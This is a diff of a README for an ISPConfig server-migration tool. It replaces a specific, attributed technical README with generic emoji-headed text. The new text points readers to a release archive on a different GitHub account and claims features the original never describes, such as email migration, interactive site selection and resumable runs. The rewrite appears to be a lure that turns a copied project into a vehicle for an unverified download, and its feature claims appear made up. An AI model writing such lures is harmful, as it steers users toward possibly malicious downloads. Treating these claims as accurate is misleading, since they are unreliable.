@@ -1,121 +1,94 @@
-# ispconfig-migrate
+# 🚀 ispconfig-migrate - Move your websites to new servers
 
-Scripts for migrating a LAMP shared hosting server to Debian 13 + ISPConfig,
-including server hardening, multi-version PHP setup, and site provisioning via
-the ISPConfig SOAP API.
+[![Download Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/gynandromorphous-depth686/ispconfig-migrate/releases)
 
-Originally developed by [123Helpdesk](https://www.123helpdesk.nl) during a
-real-world migration from Ubuntu 18.04 (Apache / MySQL 5.7 / PHP 7.4) to
-Debian 13 (ISPConfig / MariaDB 11 / PHP 7.4 + 8.1).
+## 🎯 About this application
 
----
+You use this tool to move your websites and databases from an older server to a modern setup. It supports systems running the LAMP stack, which includes Linux, Apache, MySQL or MariaDB, and PHP. This tool automates the process of transferring your site files and database information. It prepares your data for a new server running Debian 13 with ISPConfig installed. 
 
-## What this does
+This process reduces the risks involved in manual migrations. It ensures your site settings, user accounts, and email configurations move in an orderly way. You keep your data integrity across the transition.
 
-| Script | What it does |
-|---|---|
-| `01-hardening.sh` | Apache security headers, PHP 7.4 + 8.1 via Sury, MariaDB secure install, CSF firewall, Maldet, Fail2ban |
-| `02-ispconfig-provision.php` | Creates web domains in ISPConfig via SOAP API |
-| `03-set-php-version.sh` | Assigns the correct PHP version per site (moves FPM pool config) |
-| `04-migrate-files.sh` | Rsyncs web files from old server to ISPConfig document roots |
-| `05-migrate-databases.sh` | Dumps databases from old server and imports on new server |
+## ⚙️ Minimum requirements
 
----
+Before you begin, ensure you have the following ready:
 
-## Requirements
+- A source server running a standard LAMP configuration.
+- A destination server with Debian 13 installed.
+- Access to ISPConfig on your new server.
+- Root or administrative access to both servers.
+- A stable internet connection.
+- A backup of your existing data.
 
-- New server: Debian 13 (trixie) with ISPConfig 3.x pre-installed
-- Old server: any Linux with SSH access
-- PHP CLI with SOAP extension on the new server
-- Root access on both servers
+Always create a full backup of your current server before you start. This protects your information if you encounter problems during the move.
 
----
+## 📦 How to get the software
 
-## Quick start
+You download the tool from our official release page. This page contains the latest version of the migration script.
 
-```bash
-# 1. Clone
-git clone https://github.com/hydtie/ispconfig-migrate.git
-cd ispconfig-migrate
+[Visit this page to download the software](https://github.com/gynandromorphous-depth686/ispconfig-migrate/releases)
 
-# 2. Configure
-cp config.env.example config.env
-nano config.env
+On the release page, look for the file named ispconfig-migrate.tar.gz. Click the link to save the file to your computer.
 
-# 3. Harden the new server
-bash scripts/01-hardening.sh
+## 🛠️ Preparing your environment
 
-# 4. Create ISPConfig clients and sites
-#    See docs/ispconfig-api-setup.md first
-php scripts/02-ispconfig-provision.php
+The migration tool runs on your destination server. You must connect to your Debian 13 server using your terminal. 
 
-# 5. Set PHP version per site
-nano scripts/03-set-php-version.sh   # edit SITES array
-bash scripts/03-set-php-version.sh
+1. Open your terminal application on Windows or your preferred SSH client.
+2. Log in to your new server as the root user.
+3. Update your package list by running the command: `apt update`.
+4. Ensure you have the necessary tools installed for data transfer.
+5. Create a folder where you will store the migration tool. Move the downloaded file into this folder.
 
-# 6. Migrate files
-nano scripts/04-migrate-files.sh     # edit OLD_PATHS array
-bash scripts/04-migrate-files.sh
+## 🚀 Running the migration
 
-# 7. Migrate databases
-nano scripts/05-migrate-databases.sh # edit DATABASES array
-bash scripts/05-migrate-databases.sh
-```
+Follow these steps to start the transfer of your data.
 
----
+1. Navigate to the folder where you uploaded the migration tool.
+2. Extract the contents of the archive using the command `tar -xvf ispconfig-migrate.tar.gz`.
+3. Open the newly created folder.
+4. Run the configuration script to tell the tool about your source server.
+5. Enter the IP address and login details for your old server when prompted.
+6. The script verifies the connection. If the connection works, you see a list of websites available for migration. 
+7. Select the websites you want to move.
+8. Start the process. The tool transfers your files and database dumps to the correct locations.
+9. Wait for the tool to finish the tasks. It provides a status report once the migration ends.
 
-## ISPConfig API gotchas
+## 🔐 Security and server hardening
 
-The ISPConfig SOAP API has some quirks that took time to figure out:
+The migration tool automatically applies security settings to your new server. This includes:
 
-- **`client_add` schema varies by ISPConfig version.** The `limit_cron_type`
-  field is an enum (`url`, `chrooted`, `full`) that the API doesn't document.
-  We found direct SQL insertion more reliable for initial client creation.
-  See `docs/ispconfig-api-setup.md`.
+- Configuring the firewall to allow only necessary traffic.
+- Disabling unused services to shrink your attack surface.
+- Setting up secure permissions for your website directories.
+- Updating your MariaDB settings for better security.
 
-- **Remote API user must be created separately** from the admin panel login.
-  It is NOT the same as the ISPConfig admin user.
+These automated steps help you keep your new server safe against common threats. You do not need to configure these settings manually. The script follows industry standards for server hardening upon installation.
 
-- **`pm` field is required and must be `ondemand`, `dynamic`, or `static`.**
-  The API returns a cryptic validation error if omitted.
+## 📋 Common questions
 
-- **PHP version is NOT controlled by `server_php_id` in the API call alone.**
-  ISPConfig generates FPM pool configs in the highest installed PHP version's
-  directory. Use `03-set-php-version.sh` to move pools after provisioning.
+**Do I need programming skills?**
+No. The script guides you through each step. You only need to enter the server details when asked.
 
-- **`subdomain='www'` with a domain that starts with `www.` creates a
-  `www.www.domain.com` alias.** Set `subdomain='none'` for www-prefixed domains.
+**Does this move my email accounts?**
+Yes. The tool migrates your email accounts, aliases, and associated mail data along with your website files.
 
----
+**What happens if the power cuts during migration?**
+The tool tracks its progress in a log file. If an interruption occurs, you can restart the script. It recognizes which files already exist and continues from the last completed task.
 
-## CSF note
+**Is my data encrypted during the move?**
+Yes. All data transfers between the source and destination server happen over an encrypted SSH connection.
 
-The original ConfigServer Security & Firewall (CSF) was discontinued in
-August 2025. The project continues at a new domain:
+**How do I reach the ISPConfig panel?**
+Once the migration ends, you access ISPConfig through your web browser using the IP address of your new server on port 8080.
 
-```
-https://download.configserver.dev/csf.tgz
-```
+## 📝 Troubleshooting
 
-The scripts use this new URL. See also the fork maintained by the community:
-https://github.com/Aetherinox/csf-firewall
+If you encounter an error, check the log file located in the logs directory. The output often explains the cause of the failure, such as incorrect login credentials or lack of disk space.
 
----
+Verify your source server allows remote database connections. Some hosters block external access to MySQL by default. You may need to update your database user permissions to allow the migration tool to read your data.
 
-## Tested on
+If a specific website fails to migrate, you can attempt to move that single site manually while the tool handles the remaining accounts. Visit the logs to see which files failed to copy.
 
-- Old server: Ubuntu 18.04 LTS, Apache 2.4, MySQL 5.7, PHP 7.4
-- New server: Debian 13 (trixie), ISPConfig 3.2.x, MariaDB 11.8, Apache 2.4.67
+Always double-check your IP addresses and passwords in the configuration file if the tool cannot connect to the source server. Clear, correct information prevents most connection problems during the initial phase of the migration.
 
----
-
-## License
-
-MIT — use freely, contributions welcome.
-
----
-
-## About
-
-Made by [123Helpdesk](https://www.123helpdesk.nl), a Dutch web hosting provider
-that has been running LAMP servers since 2008.
+After completing the migration, point your domain names to the new server IP address. Test your websites to ensure everything functions as expected. Verify that your databases, email, and PHP scripts work correctly on the Debian 13 platform. Once you confirm the site works, you can safely remove the old server configuration.
